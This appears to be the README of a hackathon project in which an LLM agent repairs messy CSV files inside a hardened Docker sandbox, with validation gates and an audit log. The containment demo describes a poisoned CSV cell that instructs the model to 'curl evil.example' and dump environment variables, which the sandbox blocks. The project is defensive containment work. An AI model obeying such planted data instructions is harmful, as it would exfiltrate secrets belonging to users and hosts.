# vultr-csv-fixer

Upload a messy CSV. An agent writes repair code, runs it in a **locked-down throwaway Docker sandbox**, and returns the file **only after DataContractGate validators pass**.

Built for **Vultr: Agent Rush — Challenge 1: Blast Radius Zero**.

MIT License.

## Architecture

```
Browser / CLI
    │  CSV + contract YAML
    ▼
Control plane (FastAPI on Vultr Cloud Compute)
    │  1. LLM proposes pandas repair script
    │     via Vultr Serverless Inference (OpenAI-compatible)
    │  2. Script runs in throwaway container
    │  3. DataContractGate validates output rows
    │  4. Failures → retry (max 3) with error feedback
    ▼
Fixed CSV + validation report + audit log
```

### Vultr services (placeholders until deploy)

| Service | Role |
|---|---|
| **Vultr Cloud Compute (VM)** | Hosts FastAPI control plane + Docker engine |
| **Vultr Serverless Inference** | All agent LLM calls (`https://api.vultrinference.com/v1`) |
| **Docker on the VM** | Per-job sandbox (`--rm`, destroyed after run) |

No Vultr GPUs. Artifacts live in tmpfs/workdir and are deleted after the job.

### Containment design (Blast Radius Zero)

Every sandbox run uses:

- `--network none` — no egress
- empty environment (`--env-file /dev/null`) — no host secrets
- `--memory 512m`, `--cpus 1`, 30s wall clock
- `--read-only` rootfs + small `/tmp` tmpfs
- `--cap-drop ALL`, `no-new-privileges`, non-root `65534`
- `--rm` — container destroyed after the run
- bind-mount only the job workdir at `/work`

**Containment moment (demo):** a poisoned CSV cell tells the model to `curl evil.example` / dump `os.environ`. Generated code tries network + env access → sandbox blocks → audit log records `block_network` / `block_env`.

## Local run (offline)

```bash
python3 -m venv .venv
source .venv/bin/activate
pip install -r requirements.txt
pip install -e .

# Offline defaults
export MOCK_LLM=1 FORCE_MOCK_SANDBOX=1

# CLI
python -m csv_fixer.cli fixtures/messy_orders.csv fixtures/orders_contract.yaml
python -m csv_fixer.cli fixtures/poisoned_orders.csv fixtures/orders_contract.yaml

# API
uvicorn csv_fixer.api:app --reload --port 8080
# POST /fix with multipart fields csv_file + contract_file

# Tests (no network, no Docker daemon required)
pytest -q
```

`FORCE_MOCK_SANDBOX=1` statically detects hostile network/env patterns and reports them as blocked (used when the Docker daemon is unavailable). On a real host, build the worker and unset the flag:

```bash
docker compose --profile build-sandbox build sandbox
export FORCE_MOCK_SANDBOX=0 SANDBOX_IMAGE=csv-fixer-sandbox:local
```

## DataContractGate integration

Validators use the `contractgate` Python SDK local engine (`Contract.compile()` + `validate()`). Each output CSV row is checked against the ontology before the file is returned.

If `contractgate` is not installed, a minimal column/type stub activates and reports `backend=stub` — wire the real package for demos/submissions (`pip install contractgate`).

## Vultr deploy (placeholders — needs API key + VM)

1. Create a Vultr Cloud Compute instance (Docker installed).
2. Create a Vultr Serverless Inference API key; set `VULTR_INFERENCE_API_KEY` and `MOCK_LLM=0`.
3. Build images: `docker compose --profile build-sandbox build sandbox` and API image.
4. Run API with Docker socket access (or a sibling runner) so jobs can `docker run --rm ...`.
5. Put Caddy/nginx TLS in front; publish the public URL for the lablab submission.
6. Scrub secrets from the public GitHub README; document services + architecture only.

## Containment demo steps (for video)

1. Start API or use CLI with `MOCK_LLM=1` (or live Inference key).
2. Upload `fixtures/poisoned_orders.csv` + `fixtures/orders_contract.yaml`.
3. Show audit events: `block_network` / `block_env` with reasons.
4. Show retry producing a clean CSV that passes DataContractGate.
5. Contrast with `fixtures/messy_orders.csv` happy path.

## Repo layout

```
src/csv_fixer/     API, CLI, agent loop, LLM client, sandbox, validators, audit
sandbox_worker/    Dockerfile for the throwaway pandas worker
fixtures/          messy / poisoned / clean CSVs + orders contract
tests/             offline pytest (mock LLM + sandbox denial proofs)
```
